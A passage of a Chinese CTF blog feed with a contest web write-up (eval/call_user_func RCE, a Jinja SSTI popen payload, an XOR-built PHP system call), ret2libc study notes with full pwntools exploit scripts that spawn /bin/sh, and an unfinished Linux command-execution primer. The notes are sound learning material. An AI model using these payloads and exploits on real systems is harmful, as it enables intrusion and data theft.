      <url>/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p> 一场言难尽比赛,孤军奋战,尽力就好…..</p><a id="more"></a><h1 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h1><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>扫一下目录，有个<a href="http://www.rar，解压审计一下代码，找到关键文件key.php" target="_blank" rel="noopener">www.rar，解压审计一下代码，找到关键文件key.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XJNU</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/system|exec|eval|shell_exec|passthru|phpinfo/i"</span> , $_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"do not attack me"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/system|exec|eval|shell_exec|passthru|phpinfo/i"</span> , $_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"do not attack me"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/XJNU|flag/i"</span> , $_GET[<span class="string">'f'</span>]) || preg_match(<span class="string">"/XJNU|flag/i"</span> , $_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"no way!&lt;br&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$new = call_user_func_array($_GET[<span class="string">'f'</span>],[<span class="string">""</span>, $_GET[<span class="string">'b'</span>]]);</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>回调函数的rce，不过因为参数c过滤不严格，导致可以通过getheader来rce。</p><p>先var_dump(scand(“/“))找到flag文件，再用readfile读就可以了。</p><p><img src="wp-1.png" alt=""></p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>随便输入账户登录进去，fuzz一下，在每日报告的第三个参数存在ssti。过滤了些关键字，用globals来找就行。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status_1&#x3D;&amp;status_2&#x3D;&amp;status_3&#x3D;&#123;&#123;url_for.__globals__.os.popen(&#39;cat &#x2F;flag2333_canufindit&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="wp-2.png" alt=""></p><h1 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h1><h3 id="simplecalculator"><a href="#simplecalculator" class="headerlink" title="simplecalculator"></a>simplecalculator</h3><p>一个简单的命令执行,Ban一些符号与字符函数，可以通过重载函数的方法来调用。因此我们利用异或拼出GET然后调用system来rec。</p><p><img src="image-20200920162855771.png" alt="image-20200920162855771"></p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;http:&#x2F;&#x2F;172.1.21.13&#x2F;flag.php?search&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>`</p><p><img src="image-20200920163003542.png" alt="image-20200920163003542"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习pwn小记(2)</title>
      <link href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/"/>
      <url>/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/</url>
      
        <content type="html"><![CDATA[<p>在研究ret2libc时,耗费几天时间去理解学习。感觉在了解ret2libc技术的同时更多的还是学习到一些调试与编写的技术以及解决了我的一些疑惑，故写文以记之。</p><a id="more"></a><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p>在做这一道题时,checksec下</p><p><img src="image-20200914161838576.png" alt="image-20200914161838576"></p><p>发现还是开了NX，打开ida反序列化。发现有gets函数猜测有栈溢出，又发现有system函数但调用时不是system(‘/bin/sh’).但在ida中找到了’/bin/sh’.又由于调用了，猜测plt表里有system。于是思路就清晰了，用plt里system来调用‘/bin/sh’。于是得到exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">p=process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line">e=ELF(<span class="string">'./ret2libc1'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(e.plt[<span class="string">'system'</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0x08048720</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>在写这个exp时，套用了之前大佬的脚本但一直纳闷为什么在payload要system后加4个字符（‘p32(0)’）？</p><p>在学习某大佬的<a href="https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">/return2libc学习笔记</a>后，豁然开朗。其实我们payload的作用，大概如下图所示：</p><p><img src="image-20200914223959660.png" alt="image-20200914223959660"></p><p>在溢出数据后，使用libc库中system函数的地址覆盖掉原本的返回地址（这样原函数返回的时候会转而调用system函数），然后跟着是返回地址、参数。所以我们的system后加<strong>4个字符（‘p32(0)’）在图中的‘Filler’的位置指代是返回地址</strong>。</p><p>那么跟的问题也来了，为什么Filler’的位置(‘p(0)’)指代是返回地址？为什么参数跟在返回地址后面？</p><p>正常情况下，我们是通过call指令进行函数调用的，因此在进入到system函数之前，call指令已经通过push EIP将其返回地址push到栈帧中了，所以在正常情况下ret指令pop到EIP的数据就是之前call指令push到栈帧的数据，也就是说两者是成对的。但是在我们的利用漏洞攻击中，直接通过覆盖EIP地址跳转到了system函数，而并没有经过call调用，也即是没有push EIP的操作，但是system函数却照常进行了ret指令的pop EIP操作。此时的ESP指向了Filler，所以根据栈的‘后进先出’的原则在栈顶（ESP）的Filler会被pop出保存在EIP中。而EIP作用是保存的是返回地址，所以Filler就成了返回地址。</p><p><img src="image-20200915113940247.png" alt="image-20200915113940247"></p><p>同时我们在进行漏洞攻击中，与正常函数相比就只少了‘进入到system函数之前，call指令已经通过push EIP将其返回地址push到栈帧中’这一步骤，因此参数还是正常的跟在返回地址后面。</p><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p>刚做这道题看着ctf-wiki的讲解,有的蒙.因为在ret2libc1的基础上没有’/bin/sh’，然后看着上面给的exp也，没怎么看懂。自己照着<a href="https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">return2libc学习笔记</a>的思路走的（但也还是不少的弯子）。</p><p><img src="image-20200915201444197.png" alt="image-20200915201444197"></p><p>想调用system（’/bin/sh’）,但是想要一个地方储‘/bin/sh‘于是找到buf可以读写执行。于是想用个方法写’/bin/sh‘到buf。再调用在范围地址那调用EIP。开始短路了,想着用scanf然后发现自己tcl不懂参数，于是看了下大佬的解析用了get函数。于是大体思路就成：溢出调用get将’/bin/sh‘写入bss中的buf，再将返回地址指向system，并将buf传入system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(e.plt[<span class="string">'gets'</span>])+p32(e.plt[<span class="string">'system'</span>])+p32(<span class="number">0x0804A080</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>做到这里时，我产生几个疑问：</p><p>1）gets为什么能将数据写入buf？</p><p>gets函数的作用是将接收到的数据写入参数中。我们将buf地址作为参数传入gets函数，gets函数将数据写入buf地址对应空间。</p><p>2）system为什么不跟上返回地址再加参数?</p><p>在通过第一次ret2libc调用到system时，system是正常调用的。所以在调用时不需更上返回地址。可以看到进入system后esp指向的就是第一个参数。</p><p><img src="image-20200915204940834.png" alt="image-20200915204940834"></p><p>3）ctf-wiki中的payload的写法是什么？</p><p>payload的写法是溢出数据+get地址+edx地址+duf地址+system地址+返回地址+buf地址</p><p>按个人理解改写那种思路exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(e.plt[<span class="string">'gets'</span>])+p32(<span class="number">0x0804843d</span>)+p32(<span class="number">0x0804A080</span>)+p32(e.plt[<span class="string">'system'</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>EDX处命令相当于： pop edx；ret；</p><p>而：</p><blockquote><p>CPU在执行call指令时需要进行两步操作:</p><p>1.将当前的IP(也就是函数返回地址)入栈，即：push EIP;</p><p>2.跳转，即： jmp dword ptr 内存单元地址。</p><p>CPU在执行ret指令时只需要恢复IP寄存器即可，因此ret指令相当于pop EIP</p></blockquote><p>所以system地址会pop入EIP运行。</p><p>经过gdb，在ebx返回时，esp指向的是system。ret则是将system pop入EIP。证明这个是可行的</p><p><img src="image-20200915220654816.png" alt="image-20200915220654816"></p><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p>ret2libc2 的基础上，再次将 system 函数的地址去掉。我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。程序保护如下:</p><p><img src="image-20200915231136645.png" alt="image-20200915231136645"></p><p>nx打开导致我们无法直接写入shell执行。</p><p>在这里有个知识点吧：</p><p>system函数属于libc，而libc.so动态链接库中的函数之间的相对偏移是固定的，也就是说要找基地址，则有公式：<strong>A真实地址-A的偏移地址 = B真实地址-B的偏移地址 = 基地址</strong>。</p><p>由于libc的延迟绑定机制，我们需要泄漏已经执行过的函数的地址，已经执行过的话就会在got表生存下来，有了真实的地址的信息。</p><p><img src="image-20200915232459322.png" alt="image-20200915232459322"></p><p>发现程序之前调用了puts与printf函数，因此我们可以：</p><p>puts真实地址-puts的偏移地址  = 基地址= system真实地址-system的偏移地址</p><p>但是再仔细找文件，发现没给libc文件信息。</p><p>这里又用到一个知识点：</p><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，<strong>最低的 12 位并不会发生改变</strong>。如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]<span class="comment">#我们需要用put输出在服务器端的实际地址</span></span><br><span class="line">puts_got = ret2libc3.got[<span class="string">'puts'</span>]<span class="comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]<span class="comment">#返回地址被覆盖为main函数的地址，再次执行main，以求再次溢出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak puts_got addr and return to main again"</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">112</span>+ p32(puts_plt)+p32(main)+p32( puts_got)</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])<span class="comment">#交互时接受返回的在libc中的真实地址，由于是32位的文件，recv(4)是指只接收四个字节的信息，因为泄露的地址信息只存在于前四个字节，u32是指解包unpack，将一块数据解包成四个字节</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)<span class="comment">#通过偏移计算出基地址</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,"b *puts")</span></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)<span class="comment">#通过基地址，算出system在libc中的真实地址</span></span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)<span class="comment">#通过基地址，算出/bin/sh在libc中的真实地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">104</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>然后这个我踩过两个坑:</p><p>1)got地址及libc中的真实地址之间的关系.</p><p>got表里存放了libc函数的真实地址,而got地址是指的got的某一个空间的地址.这某一个空间里存放着我们要的真实地址.</p><p>2)第二次溢出的数据为104个字符.一次运行main时栈大小有108,而第二次栈大小只有有100多.</p><p>第一次:</p><p><img src="image-20200916092210173.png" alt="image-20200916092210173"></p><p>第二次:</p><p><img src="image-20200916092338372.png" alt="image-20200916092338372"></p><p>然后看下dl在wiki的留言:</p><blockquote><p>发现start函数有一句and esp, 0FFFFFFF0h进行了堆栈平衡，可以自己写个demo试一下，在and语句之前，esp的值是0xffffade8，而经过and之后，esp的值就变为了0xffffade0。所以问题就出在 _start函数的and语句，要是直接返回main函数就相当于少了一个and操作，esp的位置也就多了8。（栈的内存增长相反，即栈空间少了8）</p></blockquote><p>像是因为_start函数做了堆栈平衡,然我们第二次调用main没有做.所以esp多了8.</p><p><img src="image-20200916101954834.png" alt="image-20200916101954834"></p><p>于是改exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = ret2libc3.got[<span class="string">'puts'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak puts_got addr and return to main again"</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">112</span>+ p32(puts_plt)+p32(main)+p32( puts_got)</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_addr:'</span>+hex(puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_got:'</span>+hex(puts_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_plt:'</span>+hex(puts_plt)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">104</span>+<span class="string">'abcdefgh'</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>gdb 第一次执行get后栈:</p><p><img src="image-20200916102207673.png" alt="image-20200916102207673"></p><p>gdb 第二次执行get后栈:</p><p><img src="image-20200916103121220.png" alt="image-20200916103121220"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</a></p><p><a href="https://www.jianshu.com/p/4928e726a43f" target="_blank" rel="noopener">https://www.jianshu.com/p/4928e726a43f</a></p><p><a href="https://blog.csdn.net/qq_41918771/article/details/90665950" target="_blank" rel="noopener">https://blog.csdn.net/qq_41918771/article/details/90665950</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对linux 命令执行的总结</title>
      <link href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>最近ctf 貌似对 RCE(远程命令执行)的要求明显提高，最后一步都是考一些关于反弹shell或远程执行某文件并知晓返回结果。然后，这些本linux命令就掌握不够好的菜鸡，雪上加霜。故写下此文来记录下（顺便也方便健忘的我来记忆下(눈_눈)）</p><a id="more"></a><h2 id="linux命令分割符"><a href="#linux命令分割符" class="headerlink" title="linux命令分割符"></a>linux命令分割符</h2><p>用linux命令时候,我们想用一行来执行多条命令时我们可以用命令分割符来操作。</p><h3 id="‘-’符号"><a href="#‘-’符号" class="headerlink" title="‘;’符号"></a>‘;’符号</h3><p>用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行.用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure><h3 id="单’-’符号"><a href="#单’-’符号" class="headerlink" title="单’|’符号"></a>单’|’符号</h3><p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2</span><br></pre></td></tr></table></figure><p><img src="image-20200622144120300.png" alt="&#39;|&#39;与&#39;;&#39;不管前面命令对错"></p><p>‘;’与’|’的对比:</p><p><img src="image-20200622143338964.png" alt="&#39;;&#39;与&#39;|&#39;的对比"></p><h3 id="单’-amp-’符号"><a href="#单’-amp-’符号" class="headerlink" title="单’&amp;’符号"></a>单’&amp;’符号</h3><p>默认情况下，我们命令行执行的进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp; command2      #commond1 命令将会在后台进行</span><br></pre></td></tr></table></figure><p><img src="image-20200622145756840.png" alt="image-20200622145756840"></p><p>对比上图，可见 ‘&amp;’前面的‘ping 127.0.0.1 ’在后端运行：<img src="image-20200622150420815.png" alt="image-20200622150420815"></p><p>另外’&amp;’也是可以套娃使用的：</p><p><img src="image-20200622150115265.png" alt="image-20200622150115265"></p><p>‘&amp;’与’;’的对比:’;’是死板的从左到右,’&amp;’是将右边的放入后台执行:<img src="image-20200622145010295.png" alt="&#39;&amp;&#39;与&#39;;&#39;的对比"></p><h3 id="双’-amp-’符号（’-amp-amp-’）"><a href="#双’-amp-’符号（’-amp-amp-’）" class="headerlink" title="双’&amp;’符号（’&amp;&amp;’）"></a>双’&amp;’符号（’&amp;&amp;’）</h3><p>与c语言的’&amp;&amp;’类似，’&amp;&amp;’表时逻辑且的意思。只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2</span><br></pre></td></tr></table></figure><p>示例：</p><p><img src="image-20200622152136058.png" alt="image-20200622152136058"></p><h3 id="双’-’符号（’-’）"><a href="#双’-’符号（’-’）" class="headerlink" title="双’|’符号（’||’）"></a>双’|’符号（’||’）</h3><p>与’&amp;&amp;’相反，’||’表示逻辑或的意思。只有在 || 左边的命令返回假，|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 || command2</span><br></pre></td></tr></table></figure><p>示例：</p><p><img src="image-20200622152447856.png" alt="image-20200622152447856"></p><h2 id="linux-常用操作"><a href="#linux-常用操作" class="headerlink" title="linux 常用操作"></a>linux 常用操作</h2><h3 id="1-读取文件操作"><a href="#1-读取文件操作" class="headerlink" title="1.读取文件操作"></a>1.读取文件操作</h3><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>由第一行开始显示内容，并将所有内容输出.</p><p><img src="image-20200622162700725.png" alt="image-20200622162700725"></p><h4 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h4><p>从最后一行倒序显示内容，并将所有内容输出.</p><p><img src="image-20200622162755109.png" alt="image-20200622162755109"></p><h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>根据窗口大小，一页一页的现实文件内容.</p><p>可加<code>-数字</code> 一次显示的行数。<code>+数字</code>设置从第几行开始查看。</p><p><img src="image-20200622162907402.png" alt="image-20200622162907402"></p><h4 id="head"><a href="#head" class="headerlink" title="head"></a>head</h4><p>只显示头几行。</p><p>可加<code>-c</code> 设置一次显示的字符数。<code>-n</code>设置从显示行数。</p><p><img src="image-20200622164213205.png" alt="image-20200622164213205"></p><h4 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h4><p>只显示最后几行。</p><p>可加<code>-c</code> 设置一次显示的字符数。<code>-n</code>设置从显示行数。</p><p><img src="image-20200622164428116.png" alt="image-20200622164428116"></p><h4 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h4><p>类似于cat -n，显示时输出行号。</p><p><img src="image-20200622164512469.png" alt="image-20200622164512469"></p><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>sort 命令默认用法也有读取文件的作用。</p><p><img src="image-20200622164715443.png" alt="image-20200622164715443"></p><h4 id="paste"><a href="#paste" class="headerlink" title="paste"></a>paste</h4><p>在合并文件的同时也会输出文件的内容。（可以只传一个文件名）</p><p><img src="image-20200622165446051.png" alt="image-20200622165446051"></p><h4 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h4><p>diff在对比两个文件后，会将两个文件输出。</p><p><img src="image-20200622165541111.png" alt="image-20200622165541111"></p><h4 id="od"><a href="#od" class="headerlink" title="od"></a>od</h4><p>od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p><p>我们可以通过 -a、 -c、 -ta 、-tc 选项将其转为可见字符显示出来。</p><p><img src="image-20200622170027751.png" alt="image-20200622170027751"></p><h4 id="bzmore"><a href="#bzmore" class="headerlink" title="bzmore"></a>bzmore</h4><p>bzmore将bzip压缩过的文件解压到标准输出，同时也可以将普通文件显示到标准输出。</p><p><img src="image-20200622170430842.png" alt="image-20200622170430842"></p><h4 id="less"><a href="#less" class="headerlink" title="less"></a>less</h4><p>more类似，但其优点可以往前翻页，而且进行可以搜索字符。在默认情况下翻页。</p><p>我们反引号来进行指令替代（以某一个指令的输出结果作为另一个指令的输入项）</p><p>例如下：</p><p><img 